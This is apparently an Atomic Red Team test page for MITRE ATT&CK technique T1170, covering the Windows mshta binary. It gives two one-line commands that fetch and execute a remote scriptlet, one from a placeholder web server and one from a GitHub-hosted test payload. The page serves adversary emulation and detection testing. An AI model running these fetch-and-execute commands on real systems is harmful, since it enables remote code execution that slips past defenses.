## Mshta

MITRE ATT&CK Technique: [T1170](https://attack.mitre.org/wiki/Technique/T1170)

### Example Execution:

    mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))

## Test Script
    mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/mshta.sct").Exec();close();

[mshta.sct](https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct)
